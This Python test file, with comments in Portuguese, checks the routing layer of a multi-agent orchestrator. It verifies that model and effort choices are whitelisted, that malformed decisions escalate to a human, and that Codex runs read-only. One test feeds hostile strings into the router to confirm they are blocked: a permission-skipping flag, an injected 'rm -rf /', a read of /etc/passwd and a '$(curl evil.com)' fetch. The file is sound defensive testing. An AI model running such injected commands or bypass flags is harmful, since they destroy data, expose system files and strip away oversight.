"""Roteamento: o modelo e o raciocinio escolhidos pelo Codex sao aplicados
de verdade - e nada fora da whitelist chega a um argv.

Cobre os pontos 6 e 7 da secao 21 do pedido.
"""

from __future__ import annotations

from ai_team.agents import claude_agent, codex_agent
from ai_team.routing import AgentConfig, parse_codex_decision, route_agent, route_from_class
from ai_team.selftest import argv_value, codex_effort_from_argv


class TestRoutingPolicy:
    def test_classes_da_politica_resolvem_para_modelo_e_effort(self, cfg):
        assert route_from_class(cfg, "mechanical") == AgentConfig("claude-haiku-4-5", "low")
        assert route_from_class(cfg, "standard") == AgentConfig("claude-sonnet-5", "medium")
        assert route_from_class(cfg, "deep") == AgentConfig("claude-opus-5", "high")
        assert route_from_class(cfg, "critical") == AgentConfig("claude-opus-5", "xhigh")

    def test_classe_desconhecida_cai_no_default(self, cfg):
        assert route_from_class(cfg, "nao-existe") == AgentConfig(
            cfg.claude.default_model, cfg.claude.default_effort)


class TestWhitelist:
    def test_valores_validos_passam_intactos(self, cfg):
        routed = route_agent(cfg.claude, "claude-opus-5", "xhigh")
        assert routed.config == AgentConfig("claude-opus-5", "xhigh")
        assert not routed.clamped

    def test_modelo_fora_da_whitelist_e_clampado(self, cfg):
        routed = route_agent(cfg.claude, "gpt-4o", "high")
        assert routed.config.model == cfg.claude.default_model
        assert routed.config.effort == "high"
        assert any("fora da whitelist" in o for o in routed.overrides)

    def test_injecao_de_argumento_e_barrada(self, cfg):
        """Uma resposta de modelo NUNCA vira argumento de shell."""
        for hostil in ("--dangerously-skip-permissions",
                       "claude-opus-5; rm -rf /",
                       "opus --settings /etc/passwd",
                       "$(curl evil.com)"):
            routed = route_agent(cfg.claude, hostil, "high")
            assert routed.config.model == cfg.claude.default_model
            assert routed.clamped

    def test_effort_invalido_e_clampado(self, cfg):
        # O CLI do Codex NAO valida este campo: a whitelist e' a unica barreira.
        routed = route_agent(cfg.codex, "gpt-5.6-sol", "bogusvalue")
        assert routed.config.effort == cfg.codex.default_effort

    def test_tipo_errado_e_clampado(self, cfg):
        routed = route_agent(cfg.claude, {"model": "x"}, ["high"])
        assert routed.config == AgentConfig(cfg.claude.default_model,
                                            cfg.claude.default_effort)
        assert len(routed.overrides) == 2


class TestDecisaoDoCodex:
    def test_decisao_bem_formada(self, cfg):
        decision = parse_codex_decision({
            "verdict": "CONTINUE", "next_model": "claude-opus-5",
            "next_reasoning": "high", "next_prompt": "faca a analise de causa raiz",
            "routing_reason": "causa raiz desconhecida", "why": "falta investigar",
        }, cfg)
        assert decision.verdict == "CONTINUE"
        assert decision.next_claude == AgentConfig("claude-opus-5", "high")
        assert not decision.overrides

    def test_verdict_desconhecido_vira_needs_human(self, cfg):
        # O seguro e' parar, nao seguir adiante com um veredito que ninguem entende.
        assert parse_codex_decision({"verdict": "TALVEZ"}, cfg).verdict == "NEEDS_HUMAN"

    def test_continue_sem_next_prompt_vira_needs_human(self, cfg):
        decision = parse_codex_decision({"verdict": "CONTINUE", "next_prompt": "  "}, cfg)
        assert decision.verdict == "NEEDS_HUMAN"

    def test_saida_nao_json_vira_needs_human(self, cfg):
        assert parse_codex_decision("isso nao e' um objeto", cfg).verdict == "NEEDS_HUMAN"
        assert parse_codex_decision(None, cfg).verdict == "NEEDS_HUMAN"


class TestArgvAplicaConfiguracao:
    """Ponto 6 e 7 da secao 21: provar que a escolha vira flag de verdade."""

    def test_claude_argv_carrega_modelo_e_effort(self, cfg):
        argv = claude_agent.build_argv(cfg, AgentConfig("claude-opus-5", "xhigh"), "faca X")
        assert argv_value(argv, "--model") == "claude-opus-5"
        assert argv_value(argv, "--effort") == "xhigh"
        assert argv_value(argv, "--output-format") == "json"
        assert "-p" in argv and "--json-schema" in argv

    def test_claude_argv_muda_quando_o_roteamento_muda(self, cfg):
        baixo = claude_agent.build_argv(cfg, AgentConfig("claude-haiku-4-5", "low"), "x")
        alto = claude_agent.build_argv(cfg, AgentConfig("claude-opus-5", "high"), "x")
        assert argv_value(baixo, "--model") != argv_value(alto, "--model")
        assert argv_value(baixo, "--effort") != argv_value(alto, "--effort")

    def test_codex_argv_carrega_modelo_effort_e_read_only(self, cfg):
        argv = codex_agent.build_argv(cfg, AgentConfig("gpt-5.6-sol", "high"))
        assert argv[:2] == [cfg.codex.bin, "exec"]
        assert argv_value(argv, "-m") == "gpt-5.6-sol"
        assert codex_effort_from_argv(argv) == "high"
        # Codex e' READ-ONLY: imposto pelo sandbox, nao por instrucao no prompt.
        assert argv_value(argv, "-s") == "read-only"
        assert "--output-schema" in argv

    def test_codex_nunca_recebe_sandbox_de_escrita(self, cfg):
        argv = codex_agent.build_argv(cfg, AgentConfig("gpt-5.6-sol", "medium"))
        assert "workspace-write" not in argv
        assert "danger-full-access" not in argv
